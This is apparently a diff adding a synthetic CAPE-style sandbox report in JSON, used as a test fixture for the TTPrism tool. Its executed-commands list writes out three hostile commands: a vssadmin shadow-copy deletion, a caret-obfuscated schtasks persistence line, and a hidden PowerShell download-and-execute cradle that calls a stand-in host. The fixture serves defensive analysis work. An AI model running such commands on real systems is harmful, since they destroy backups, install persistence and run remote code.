@@ -1,0 +1,155 @@
+{
+  "_comment": "Synthetic CAPE-style report for TTPrism tests. All values are reserved documentation names/addresses or hashes of harmless strings; nothing here comes from real malware.",
+  "info": {
+    "id": 1,
+    "version": "synthetic",
+    "package": "exe"
+  },
+  "target": {
+    "category": "file",
+    "file": {
+      "name": "invoice.exe",
+      "md5": "5f89cef4c9ed3f109bc7c400d822e60e",
+      "sha1": "a2eebf3d37a530f407d8907e869f880fa5346b29",
+      "sha256": "8ddcb559924bcba8d5497d45f66c01316bb77d5cf8618b9771e62166fdbbce05"
+    }
+  },
+  "dropped": [
+    {
+      "name": "upd.exe",
+      "md5": "1b2062450bd3d9b1f41aadadae4f44f1",
+      "sha1": "fe077a501a66e0b4be2672b15928a38ae34068af",
+      "sha256": "334486bd1343a3dd88c93f57d0b16f08d906bccb7cf084f1e545547defabb6dc"
+    }
+  ],
+  "network": {
+    "hosts": [
+      {
+        "ip": "198.51.100.23",
+        "country_name": "reserved"
+      },
+      {
+        "ip": "8.8.8.8"
+      },
+      "203.0.113.5"
+    ],
+    "domains": [
+      {
+        "domain": "update-check.example",
+        "ip": "198.51.100.23"
+      },
+      {
+        "domain": "www.msftconnecttest.com",
+        "ip": "192.0.2.80"
+      }
+    ],
+    "dns": [
+      {
+        "request": "cdn.update-check.example",
+        "type": "A",
+        "answers": [
+          {
+            "type": "A",
+            "data": "203.0.113.7"
+          },
+          {
+            "type": "CNAME",
+            "data": "edge.update-check.example"
+          }
+        ]
+      }
+    ],
+    "http": [
+      {
+        "uri": "http://update-check.example/gate.php?id=1",
+        "host": "update-check.example",
+        "method": "POST"
+      }
+    ],
+    "https_ex": [
+      {
+        "host": "cdn.update-check.example:443",
+        "uri": "/stage2.bin",
+        "protocol": "https"
+      }
+    ]
+  },
+  "behavior": {
+    "processes": [
+      {
+        "process_id": 1234,
+        "process_name": "invoice.exe",
+        "environ": {
+          "CommandLine": "C:\\Users\\analyst\\invoice.exe"
+        },
+        "calls": [
+          {
+            "api": "NtUnmapViewOfSection"
+          },
+          {
+            "api": "NtWriteVirtualMemory"
+          },
+          {
+            "api": "NtSetContextThread"
+          },
+          {
+            "api": "NtResumeThread"
+          },
+          {
+            "api": "URLDownloadToFileW"
+          }
+        ]
+      }
+    ],
+    "summary": {
+      "executed_commands": [
+        "\"C:\\Windows\\System32\\vssadmin.exe\" Delete Shadows /All /Quiet",
+        "s^c^h^t^a^s^k^s /create /tn upd /tr C:\\Users\\analyst\\upd.exe /sc minute",
+        "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://update-check.example/p.ps1')\""
+      ],
+      "write_keys": [
+        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater"
+      ]
+    }
+  },
+  "signatures": [
+    {
+      "name": "injection_runpe",
+      "severity": 3
+    },
+    {
+      "name": "antivm_vbox_files",
+      "severity": 2
+    },
+    {
+      "name": "packer_upx",
+      "severity": 1
+    }
+  ],
+  "ttps": [
+    {
+      "signature": "injection_runpe",
+      "ttps": [
+        "T1055"
+      ]
+    },
+    {
+      "signature": "antivm_vbox_files",
+      "ttps": [
+        "T1497"
+      ]
+    },
+    {
+      "signature": "packer_upx",
+      "ttps": [
+        "T1045"
+      ]
+    },
+    {
+      "signature": "uses_windows_utilities_dsquery",
+      "ttps": [
+        "S0105"
+      ]
+    }
+  ]
+}
